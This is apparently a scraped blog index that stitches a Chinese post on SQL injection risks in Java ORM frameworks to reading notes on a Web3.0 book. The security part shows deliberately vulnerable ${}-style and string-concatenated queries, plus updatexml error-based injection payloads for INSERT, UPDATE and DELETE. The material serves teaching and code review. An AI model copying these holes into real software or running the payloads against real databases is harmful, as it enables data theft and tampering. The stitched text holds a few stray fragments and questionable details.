JPA（Java Persistence API） JPA是规范，它指明了持久化、读取和管理 Java 对象映射到数据库表时的规范。 JPQL（Java Persistence Query Language） Spring Data JPA 是 Spring Framework 的一部分。它不是 JPA 的实现，而是在 JPA 之上提供更高层次的抽象，可以减少很多模板代码。而 Spring Data JAP 的默认实现是 Hibernate，当然也可以其他的 JPA Provider。 SQL、JPQL、HQL Hibernate Hibernate 是一个 ORM 框架，它实现了 Java 对象到数据库表的映射。也就是说，Hibernate 提供了 JPA 的一种实现。 HQL（Hibernate Query Language） MyBatis与JPA的差异点： 设计哲学不同，MyBatis偏向于面向过程，JPA则将面向对象发挥到极致； MyBatis定制起来更加灵活，支持高度定制化的sql语句，支持任意编写sql语句；JPA相对更注重对已有高频简单操作场景的封装，简化开发人员的重复操作，虽然JPA也支持定制SQL语句，但是相比MyBatis灵活度略差。 添加pom \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-data-jpa\u003c/artifactId\u003e \u003cversion\u003e2.5.2\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e8.0.25\u003c/version\u003e \u003c/dependency\u003e 入口注解 @SpringBootApplication // 可选，指定扫描的表映射实体Entity的目录，如果不指定，会扫描全部目录 //@EntityScan(\"com.veezean.demo.entity\") // 可选，指定扫描的表repository目录，如果不指定，会扫描全部目录 //@EnableJpaRepositories(basePackages = {\"com.veezean.demo.repository\"}) // 可选，开启JPA auditing能力，可以自动赋值一些字段，比如创建时间、最后一次修改时间等等 //@EnableJpaAuditing public class Application { public static void main(String[] args) { SpringApplication.run(Application.class, args); } } 配置数据源,application.properties或application.yml中配置数据源： # 数据库URL、用户名、密码等信息 spring.datasource.url=jdbc:mysql://localhost:3306/javawebtest?useSSL=false\u0026allowPublicKeyRetrieval=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=sss123 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver #Hibernate相关的属性 spring.jpa.hibernate.ddl-auto=create-drop spring.jpa.show-sql=true #Java代码实体字段命名与数据库表结构字段之间的名称映射策略 #spring.jpa.hibernate.naming.implicit-strategy=org.hibernate.boot.model.naming.ImplicitNamingStrategyLegacyJpaImpl #下面配置开启后，会禁止将驼峰转为下划线 #spring.jpa.hibernate.naming.physical-strategy=org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl #spring.jpa.open-in-view=false #spring.jpa.properties.hibernate.enable_lazy_load_no_trans=true # 控制是否可以基于程序中Entity的定义自动创建或者修改DB中表结构 #spring.jpa.properties.hibernate.hbm2ddl.auto=update 创建要持久化到数据库中的实体类，User类： @Entity @Table(name = \"user\") public class User { @Id // 唯一标识符 @GeneratedValue(strategy = GenerationType.IDENTITY) // 使用自增长字段生成 private Long id; @Column(nullable = false, unique = true) // 不能为空，且唯一 private String username; @Column(nullable = false) private String password; // getters/setters } 创建JpaRepository来管理实体类，UserRepository接口 public interface UserRepository extends JpaRepository\u003cUser, Long\u003e { User findByUsername(String username); // JPA根据方法名自动生成查询语句 /org/springframework/aop/framework/JdkDynamicAopProxy.class //原生SQL //@Query(value = \"select * from user where username = ?1\", nativeQuery = true) //User fuzzyQueryByName(String username); //HQL提供的查询语法 //@Query(\"FROM User u WHERE u.username = :username\") //User fuzzyQueryByName(@Param(\"username\") String username); //JPQL1提供的查询语法 @Query(\"SELECT u FROM User u WHERE u.username = :username\") User fuzzyQueryByName(@Param(\"username\") String username); //JPQL2提供的查询语法 //@Query(\"SELECT u FROM User u WHERE u.username = ?1\") //User fuzzyQueryByName(String username); } 创建UserService服务类，使UserRepository仓库类进行数据库操作： @Service // 被@Autowired注解进行注入使用 @Transactional // 事务操作。如果出现了异常，事务将被回滚到之前的状态。（如果出现了异常，事务将回滚到之前的状态，保证数据的一致性和完整性。） public class UserService { @Autowired // @Autowired注解寻找同名@Service 注入使用 private UserRepository userRepository; public User findByUsername(String username) { return userRepository.findByUse","date":"2024-04-13","objectID":"/posts/sql-injection-code/:2:3","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"4、Mybatis pom \u003c!-- MyBatis依赖 --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.mybatis.spring.boot\u003c/groupId\u003e \u003cartifactId\u003emybatis-spring-boot-starter\u003c/artifactId\u003e \u003cversion\u003e2.1.4\u003c/version\u003e \u003c/dependency\u003e \u003c!-- 数据库驱动依赖 --\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e8.0.22\u003c/version\u003e \u003c/dependency\u003e User.java public class User { private Long id; private String username; private String password; public User() { } public User(String username, Long id, String password) { this.username = username; this.id = id; this.password = password; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public Long getId() { return id; } public void setId(Long id) { this.id = id; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } } interface @Mapper public interface UserMapper { @Select(\"SELECT id, username, password FROM user WHERE id = #{id}\") User findById(String id); @Select(\"SELECT id, username, password FROM user\") List\u003cUser\u003e findAll(); } controller @RestController public class UserController { @Autowired private UserMapper userMapper; @PostMapping(\"/users/id\") public User findById(String id) { return userMapper.findById(id); } @GetMapping(\"/users\") public List\u003cUser\u003e findAll() { return userMapper.findAll(); } } （1）使用注解方式 可以使用@Select、@Insert、@Update、@Delete等注解来执行对应的SQL语句 @Mapper public interface UserMapper { // 不存在注入 @Select(\"SELECT id, username, password FROM user WHERE id = #{id}\") User findById(String id); // 存在注入 @Select(\"SELECT id, username, password FROM user WHERE id = '${id}'\") User findById(String id); } （2）使用Mapper XML配置文件 将SQL语句放入指定的Mapper XML配置文件中 # 数据库配置 spring.datasource.url=jdbc:mysql://localhost:3306/javawebtest?useSSL=false\u0026allowPublicKeyRetrieval=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=sss123 spring.datasource.driver-class-name=com.mysql.jdbc.Driver # MyBatis配置 mybatis.mapper-locations=classpath:mapper/*.xml mybatis.type-aliases-package=com.example.mybatis.entity @Mapper public interface UserMapper { User findById(String id); } \u003c!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"\u003e \u003cmapper namespace=\"com.example.mybatis.entity.UserMapper\"\u003e \u003c!-- sql注入--\u003e \u003cselect id=\"findById\" resultType=\"com.example.mybatis.User\"\u003e SELECT * FROM user WHERE id = ${id} \u003c/select\u003e \u003c!-- 预编译--\u003e \u003cselect id=\"findById\" resultType=\"com.example.mybatis.User\"\u003e SELECT * FROM user WHERE id = #{id} \u003c/select\u003e \u003c/mapper\u003e ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:2:4","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"5、Mybatis-plus Mybatis-Plus 是在 Mybatis 的基础上进行的封装和拓展，提供了更加方便的数据库操作方式和更好的性能优化 （1）BaseMapper 符合标准，不存在注入 public interface UserMapper extends BaseMapper\u003cUser\u003e { } @Service public class UserService { @Autowired private UserMapper userMapper; public User selectById(Long id) { return userMapper.selectById(id); } } （2）Wrapper 条件构造器 条件构造器Wrapper可以用于复杂的数据库操作：大于、小于、模糊查询等等。 // 预编译 @RestController public class UserController { @Autowired private UserMapper userMapper; @RequestMapping(\"/users/id\") public List\u003cUser\u003e selectByName(Long id) { QueryWrapper\u003cUser\u003e queryWrapper = new QueryWrapper\u003c\u003e(); queryWrapper.eq(\"id\", id); return userMapper.selectList(queryWrapper); } } @RestController public class UserController { @Autowired private UserMapper userMapper; @RequestMapping(\"/users/id\") public List\u003cUser\u003e selectByName(Long id) { QueryWrapper\u003cUser\u003e queryWrapper = new QueryWrapper\u003c\u003e(); queryWrapper.apply(\"id={0}\",id); //用了{}防止注入 return userMapper.selectList(queryWrapper); } } // 注入 @RestController public class UserController { @Autowired private UserMapper userMapper; @RequestMapping(\"/users/id\") public List\u003cUser\u003e selectByName(Long id) { QueryWrapper\u003cUser\u003e queryWrapper = new QueryWrapper\u003c\u003e(); queryWrapper.apply(\"id=\"+id); //用了 apply/last/exists/notExists/having/inSql/notInSql/orderBy/orderByAsc/orderByDesc/groupBy 都会注入 return userMapper.selectList(queryWrapper); } } （3）XML pom \u003c!-- Mybatis-plus --\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.baomidou\u003c/groupId\u003e \u003cartifactId\u003emybatis-plus-boot-starter\u003c/artifactId\u003e \u003cversion\u003e3.3.0\u003c/version\u003e \u003c/dependency\u003e 配置 # 数据库配置 spring.datasource.url=jdbc:mysql://localhost:3306/javawebtest?useSSL=false\u0026allowPublicKeyRetrieval=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=sss123 spring.datasource.driver-class-name=com.mysql.jdbc.Driver # MyBatis配置 mybatis-plus.type-aliases-package=com.example.mybatis.entity mybatis-plus.mapper-locations=mapper/**.xml mybatis-plus.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl User @Data // get/set lombok实现 @NoArgsConstructor // 无参构造器 @AllArgsConstructor // 含参垢早起 @TableName(\"user\") public class User { @TableId @TableField(\"id\") private Long id; @TableField(\"username\") private String userName; @TableField(\"password\") private String password; } Mapper public interface UserMapper extends BaseMapper\u003cUser\u003e { List\u003cUser\u003e selectNameById(Long id); } mapper xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"\u003e \u003cmapper namespace=\"com.example.mybatis.mapper.UserMapper\"\u003e \u003cselect id=\"selectNameById\" resultType=\"com.example.mybatis.entity.User\"\u003e select * from user where id = ${id} \u003c/select\u003e \u003c!--预编译--\u003e \u003cselect id=\"selectNameById\" resultType=\"com.example.mybatis.entity.User\"\u003e select * from user where id = #{id} \u003c/select\u003e \u003c/mapper\u003e controller @RestController public class UserController { @Autowired private UserMapper userMapper; @RequestMapping(\"/users/id\") public List\u003cUser\u003e getId(Long id){ return userMapper.selectNameById(id); } } （4）注解（同mybatis，忽略） 忽略 ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:2:5","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"6、易出现的点 PreparedStatement只有在使用\"?“作为占位符才能预防sql注入，直接拼接仍会存在sql注入漏洞 删除语句中可能会存在此类语句,由于无法确定ids含有对象个数而直接拼接sql语句，造成sql注入。 String sql = \"delete from users where id in(\"+delIds+\"); //存在sql注入 解决方法为遍历传入的 对象个数，使用“?”占位符。 模糊查询使用like语句直接拼接会造成sql注入， 在这种情况下使用#{}程序会报错，新手程序员就把#号改成了$,这样如果java代码层面没有对用户输入的内容做处理势必会产生SQL注入漏洞。如果黑名单要过滤%和_符号，否则造成慢查询 String sql = \"select * from users where password like '%\" + con + \"%'\"; //存在sql注入 字段名表名不能预编译，因为不能带引号 ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:2:6","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"三、注入点 ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:3:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"1、select 语法顺序 执行顺序 SELECT 7 字段名 查询的表中必须含有字段名，负责报错 FROM 1 表名 正常注入 JOIN 3 表名 ON 2 字段名 WHERE 4 字段 正常注入，如果不加GROUP BY直接写HAVING 1=1会爆表名 GROUP BY 5 字段名 报错注入，group by 后面的字段是虚拟表的主键。也就是说它是不能重复的。 HAVING 6 字段名 HAVING 语句通常与GROUP BY语句联合使用，用来过滤由GROUP BY语句返回的记录集，如group by 查找字段为 user_id 的所有数据，然后用 having 筛选 user_id=1 的那条数据。 UNION 8 ORDER BY 9 字段名 order by后面可以跟if(),case when else这样的复合查询语句。可以用来进行bool注入，延时注入等 LIMIT 10 数值型 limit后面不能直接跟select语句和if语句。可以跟procedure语句，值得注意的是只有在5.0.0\u003c MySQL \u003c5.6.6版本才可以使用，procedure后面支持报错注入以及时间盲注 SELECT _time AS time_col, sum(page) AS metric_value, concat('l_', type) as tag_name FROM ks_abtest.result WHERE _time \u003e= '2024-04-12 00:00:00' AND world_name = 'holdout_kuaishou_all_did_0' AND type in ('r1', 'r2', 'r3') AND type like '%r%' GROUP BY time_col, tag_name HAVING metric_value \u003e 100 ORDER BY time_col ASC LIMIT #{limit} UNION ALL SELECT '1' as tag_name FROM user; join SELECT r._time AS time_col, SUM(r.page) AS metric_value, CONCAT('l_', r.type) AS tag_name, u.username AS username FROM ks_abtest.result AS r JOIN user AS u ON r.user_id = u.user_id WHERE r._time \u003e= '2024-04-12 00:00:00' AND r.world_name = 'holdout_kuaishou_all_did_0' AND r.type IN ('r1', 'r2', 'r3') GROUP BY time_col, tag_name, username ORDER BY time_col ASC LIMIT #{limit}; ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:3:1","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"2、insert INSERT INTO Websites (name, url, alexa, country) VALUES ('百度','https://www.baidu.com/','4','CN'); payload： INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or'', 'Nervo'); ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:3:2","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"3、update UPDATE Websites SET alexa='5000', country='USA' WHERE name='菜鸟教程' AND c.country IN ('China', 'USA') ORDER BY a desc LIMIT 100; payload： UPDATE users SET password='Nicky' or updatexml(2,concat(0x7e,(version())),0) or''WHERE id=2 and username='Olivia'; ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:3:3","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"4、delete DELETE FROM Websites WHERE name='Facebook' AND c.country IN ('China', 'USA') ORDER BY a desc LIMIT 100; payload： DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or''; ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:3:4","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["读书心语"],"content":"传统的Web2.0应用是以中心化的服务器为基础架构，并在服务器运行应用程序和处理用户数据。但Web3.0则采用分布式结构，借助于区块链等技术来实现数据和应用的去中心化。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:0:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"一、Web发展阶段 阶段 年份 特点 产品 技术 为何诞生 Web1.0 1980 - 2000 年 读（静态网页） wiki 前端 满足人们获取信息 Web2.0 2000 - 2020 年 读、写（中心化、互动和创造内容） 微信、淘宝 前端+后端 用户互动、分享和交流的需求 Web3.0 2020 - X 年 读、写、拥有（去中心化） 元宇宙、虚拟货币、DAO、DeFi 区块链 解决Web2.0中心化的安全问题 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:1:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"二、区块链 区块链是一种思维方式，区块链是平坦的没有中心，这个服务并不是某个机构提供的，而是所有人共同提供的（共识） 全民记账系统，只有超过50%才能成为事实，通过信息共享保证信息安全 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:2:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"1、不可能三角 不可能三角是太坊创始人Vitalik Buterin提出的理论，区块链网络无法同时实现安全性、去中心化和可扩展性 web3.0不可能三角 可扩展性（区块存储扩展以处理更多的交易数据和用户）：需要节点更好的配置和带宽，否则区块打包及交易变慢 去中心化（由网络中的所有节点共同控制和维护）：需要多节点，但如果区块需要同时计算和存储，则交易速度会下降 安全性（由加密技术和分布式记录的方式保证数据不可篡改）：需要多节点验证和确认，节点多和算法复杂，导致交易速度下降 满足条件 导致结果 去中心化、安全性 需要所有节点参与计算和存储（去中心化），这将提高对网络吞吐量的要求和硬件设施性能的需求，限制许多节点的加入（可扩展性） 去中心化、可扩展 这条区块链的节点是非常分散的，需要分散计算和存储，无法达到全量共识，攻击难度就会下降，有不可靠的节点存在时，整条链的安全会受到威胁 安全性、可扩展性 要保证参与共识的节点是可信的，就要做到中心化管理，去中心化就会降低 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:2:1","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"2、共识机制 多方认证的方法，确保稳定性、可靠性及真实性 工作量证明（Proof of Work，PoW） 节点在争夺新的区块权时，需要对上一个区块的区块头进行某种运算（比如比特币采用SHA256），直到得到目标值即出块成功。比特币、以太坊均采用PoW共识机制 权益证明（Proof of Stake，PoS） PoW共识机制浪费能源，PoS省去了矿机消耗电力环节，通过使用Staking（质押，质押一定凭证来获取相关权益的行为）的数额来提高自己的投票权，只需要进行签名就可以验证。 历史证明（Proof of History，PoH） PoH由Solana提出，验证者将时间戳传递给PoH生成器，由其使用SHA256 VDF（可验证的延迟函数）生成唯一的哈希值，来维护网络的时间序列。Solana的每个验证者都基于PoH维护自己的时钟，并参与Tower BFT共识协议，在共识过程中先选择领导者（打包），并在纪元结束时对领导者和验证者给予补偿（奖励）。 权威证明（Proof of Authority，PoA） 只有获得权限的节点才能参与网络治理。PoA一般用在联盟链或者较为中心化的区块链中，保证整个网络的参与方都是可靠的 荣誉共识（Proof of Reputation，PoR） PoR与PoA类似，区别在于PoR的出块机制依靠每个节点自身的荣誉值（品牌形象、品牌价值、链上行为的可信任度等） 存储证明（Proof of Storage，PoS） ​ PoS的投票权根据节点提供的存储空间确定 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:2:2","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"3、公链\u0026联盟链 公链 公链是区块链最基础的底层网络，其他协议都是在公链网络上进行部署的，公链的特点如下： 完全去中心化：链上的任何人都可以部署智能合约和发起交易，链上所有数据由节点共同维护，官方只能提供技术支持，无法对公链系统中的信息进行操控 任何人都可以匿名参与：公链无准入机制，任何人都能成为公链节点，即使官方不在维护，公链也会一直存在 数据是全网公开的 节点数量多变且不可预知 运维成本较高，依赖奖励机制：公链节点不是免费为系统提供记账和维护的，交易着需要向节点提供记账手续费 交易速度较慢：新生公链正在努力突破技术限制，提高交易速度和网络吞吐量 联盟链 公链和联盟链使用场景不同，私密度很高的和数据不适合存放在公链上，而联盟链仅允许获得授权的节点加入网络，不同节点的权限不同，信息仅可被有权限的节点查看，因此联盟链的使用场景往往是企业间的交互，联盟链的特点如下 多组织共同参与管理：由多个机构共同参与管理 隐私保护良好：进入联盟的节点都具有很高的信任度，同时数据权限由机构决定 企业背书：联盟链跑路了数据就销毁了 私有链 ​ 私有链面向单独个体或企业 （1）比特币 广播交易：发生一笔交易后，这个交易会被广播到整个网络的所有节点。广播内容包括： 支付记录 付款方数字签名：私钥(SHA256(“支付记录”)) 付款方公钥 打包区块：每个节点都节点接收交易记录，逐个检查交易记录是否符合要求，当有足够多的节点确认了这个交易，它就会被打包进一个区块中，（未确认交易池）。 是否重复交易 付款方金额大于等于余额 公钥解密付款方数字签名：获得哈希值 哈希支付记录：SHA256(“支付记录”) 验证签名：如果哈希值等于哈希支付记录，说明签名是针对这条记录、签名是支付者的、与原始记录相同未篡改 矿工生成新区块：区块（交易记录1、交易记录2、交易记录3），放到最后一个区块上。加入到区块链上后才得到网络确认 解决PoW难题：打包区块的节点需要解决一个复杂的难题，这就是所谓的工作量证明（PoW）。节点需要不断尝试使用不同的随机数计算出符合要求的hash，这需要消耗大量的计算能力。 限制单位时间内，生成新区块的数量，10分钟左右1个新区块： 新区块所包含的内容：前一个区块的SHA256+这个新区块的基本信息+这个新区块交易记录+随机数。组合成一个字符串 共识计算：SHA256(“新字符串”) = 一个256位二进制数，如果这个数前72位全是0，才算完成计算 广播区块：当一个节点解决了这个难题，它就可以将新的区块广播到整个网络。其他节点验证这个区块的hash是否符合要求，并检查其中的每个交易是否合法。 检查是否符合：SHA256(前一个区块的SHA256+这个新区块的基本信息+这个新区块交易记录+这个数) 检查区块中的记录是否符合要求 验证并存储区块：如果一个节点发现了两个不同的区块，它会选择其中最长的区块作为主链，并将不符合条件的区块丢弃。因为只有最长的链才代表了最多的工作量，也就是最可信的链。 把新区块添加到自己区块的末尾 QA 如何进行同步，没联网、没开机、收到记录时间不一致，以谁为准 最长的区块链，检查后确认无误，进行同步 如何防止记录被篡改，黑客更改多个计算机记录，如何防止黑客更改记录 只要中间有改动，后面的链就断开了；而BTC只维护最长的区块链 如何防止同一笔收入被重复使用，同时支付的问题 制作新区块时检查每个交易记录的输入值，是否在前面的区块交易记录使用过，如果被使用过则无效 如果同时生成了2个新区块，怎么选择 此时分叉，每个矿工再有新区块时，会放在先接收到的区块后面，而放弃另一个（风险：如果BTC出现分叉，短的那条链上的交易历史记录将被删除，即所有在该条链上已经确认的交易将被退回，并视为未被确认的状态）。btc节点只认最长的支链 （2）以太坊 —— 万链之王 以太坊（Ethereum）是建立在区块链上的去中心化应用平台，智能合约和DApp（Decentralized Application，去中心化应用程序）给开发者提供了更广泛的架构。以太坊对底层区块链进行封装，降低了开发者的开发难度。 DApp：部署在公链上的App，在以太坊中，一般认为DApp是包含UI和智能合约 智能合约：本质是脚本，开发时便设计好自动处理逻辑 （3）异构公链 与以太坊互补兼容的公链系统 Solana：是一个采用委托权益证明协议（快速、安全、抵抗审查）单层区块链，为生态应用提供基础设施（下一个以太坊），基础共识机制为PoS，但不同的是引入了一种叫PoH的共识机制 Flow：Flow是服务于去中心化游戏应用的公链，在解决网络拥堵、高使用门槛问题上有突出成就；特色架构为多角色参与模式，工作分配4种角色完成构成一种流水线模型，目的是避免重复劳动，节点通过质押Token，分为4种角色，为同一笔交易服务（这也叫节点间的垂直分工） 收集：通过增强生态应用上的网络链接和数据的可用性，提高整体效率 共识：决定一笔交易是否真实存在，及在交易链上的顺序，保证去中心化 执行：负责交易相关的计算工作 验证：负责监督和验证执行节点的工作 Conflux：团队是清华学堂计算机科学实验室（姚班，姚期智）、清华、多伦多、麻省理、上海交大等，姚期智任首席科学家，全新的共识协议，认证存储、交易中集。在Conflux上，区块被组织为树形图 （4）多链结构的公链 ​ 采用多条链并行运行的公链。这种公链结构允许不同类型的应用和智能合约能够在不同的链上运行，从而提高网络的处理能力、强化安全性和降低拥堵 NEAR：是一种高度可扩展的公链，支持生态应用在移动设备商运行，NEAR自我定义是以太坊2.0，意在解决以太坊的可扩展性问题 Avalanche：译为雪崩，是基于独创的共识机制，提高了去中心化和吞吐量、快速交易、低手续费、低延迟，更多面向金融领域。 （5）Layer2 区块链逻辑三层结构 Layer0：传输层 Layer1：数据层、网络层、共识层、激励层（防止区块链攻击） Layer2：合约层、应用层（在应用层提高区块链的性能） （6）跨链双雄的独特行走 Polkadot：波卡是一种跨链技术，旨在解决区块链架构的伸缩性和隔离性问题，通过“中继链”“平行链”“转接桥”实现了跨链和可拓展的问题，主要目的是将各条独立的区块链连接起来，使不同区块链之间可以进行数据传递和智能合约的调用。（成为更通用、更具普适性的跨链协议而努力） Cosmos：关于Cosmos，最深入人心的一个说法是，“Cosmos是区块链的互联网”。Cosmos解决了区块链之间的孤岛效应。Cosmos本身的含义是“宇宙”，可以说与其用途和理想很契合（专注于数字资产的跨链转移） ","date":"2024-03-07","objectID":"/posts/read-web3-book/:2:3","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"4、区块链世界的“桥”：跨链工具 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:2:4","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"为什么需要跨链工具 人们更期待能有一条链替代以太坊等传统公链，而非紧紧围绕在以太坊周围发展。正因为此，便催生了如今规模庞大的跨链生态市场。目前，跨链工具主要有以下3种用途。 提高资产的利用率：跨链工具让比特币等数字资产可以在其他公链上应用，提高了资产的利用率和价值。比特币可以被用作抵押品、做市资金、支付工具和购买NFT等，而不仅仅被视为“数字黄金”。 扩展更多的可能性：跨链工具拓展了产品协议的服务对象范围，提高了竞争力和开发新功能的可能性。比如，Aave V3的产品规划就最具有革新性。Aave团队打算通过跨链技术，逐步把Aave接入更多公链和Layer 2网络，促进链上资产在多链之间的流动和转移。未来，单链应用将逐渐式微，多链接入将成为DApp的标配。 解锁更多的新玩法：跨链工具为Web3.0的用户和开发者提供了新的玩法。跨链工具是一个不可或缺的基础设施，相当于多链生态中的重要\"中间件\"。通过跨链工具，用户可以捕捉到不同区块链之间的机会，如不同交易所或借贷平台之间的利率差，并进行跨链套利。更多的NFT发行方也能够在多链上发行和使用NFT。以MultiChain为代表的跨链工具已经在这方面有了充实的实践。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:2:5","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"5、预言机 区块链外信息写入区块链内的机制，称为预言机。预言英语叫Oracle意味着神谕，智能合约无法自行访问链下数据，所有信息都来自外部的数据源，如果这台预言机出现问题或者遭受攻击，你怎么知道他给你提供的数据是否准确呢？因此出现了去中心化的预言机，所有人都对要写入区块的信息进行分析，并对结果进行投票。Chainlink（代币LINK）预言机信誉系统是一个特色，由各种指标综合衡量，包括运行时间、响应时间、成功完成的任务量等 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:2:6","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"6、去中心化存储 IPFS的全称为InterPlanetary File System，即星际文件系统。IPFS是一个分布式的点对点多媒体传输系统，其目标是取代HTTP的地位。建立在IPFS上的Filecoin应运而生，可以理解为IPFS的扩展经济层，用于给数据存储放提供经济激励。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:2:7","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"三、NFT（Non-Fungible Token，非同质化通证） 可以把NFT理解为一种数据格式，存储在区块上，包括声音、视频、文本、图片，特点如下 Token：密算法来保证代币的唯一性和不可复制性 存储在链上：NFT存储在区块链上，每个NFT代表一个单独的数字资产，可以在链上验证和交换所有权 唯一编码：NFT的唯一标识符由区块链上的数字代码表示，这个编码是不可更改的。这意味着每个NFT都有一个不可替代的标识符，它是唯一的，并且不能与其他NFT混淆。 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:3:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"1、NFT的协议标准 （1）EIP和ERC EIP全称是Ethereum Improvement Proposals，即以太坊改进提案，公开征集优化以太坊区块链，任何一次更新都是EIP的贡献 阶段为EIP提出草案阶段、社区讨论调整草案、接收阶段、应用到以太坊就变成了终稿（EIP委员会批准并确定应用，他就成为ERC，全称为Ethereum Request for Comment，即以太坊意见征求稿，用于记录以太坊上应用级的各种开发标准和协议）ERC-20代表20号提案。 （2）NFT分类 Avatar：一种基于区块链技术的虚拟形象或角色，可以在游戏、社交媒体等场景中使用。 音乐NFT：记录了音乐作品的版权信息和交易记录。这种NFT可以确保音乐作品的唯一性和数字所有权，也为音乐行业带来了全新的商业模式和转化方式。 素人自拍NFT：普通人将自己的照片或视频制作成独特的数字艺术品，记录所有权和交易记录。 体育：体育明星、体育赛事门票NFT 品牌、企业纪念类：企业文化虚拟人物 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:3:1","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"四、元宇宙 Metaverse（元宇宙） = Meta + Universe，Meta翻译为超越，所以Metaverse是超越现实世界的存在，2021年是元宇宙元年 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:4:0","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- a15a","uri":"/posts/read-web3-book/"},{"categories":["读书心语"],"content":"1、元宇宙的技术基础 区块链-大同虚实的价值链 感官真实 VR虚拟现实 AR增强现实 MR混合现实 VT味觉真实 通信技术 云计算 AI辅助 脑机接口 ","date":"2024-03-07","objectID":"/posts/read-web3-book/:4:1","tags":["Web3.0","区块链"],"title":"阅读 -《一本书读懂Web3.0》- 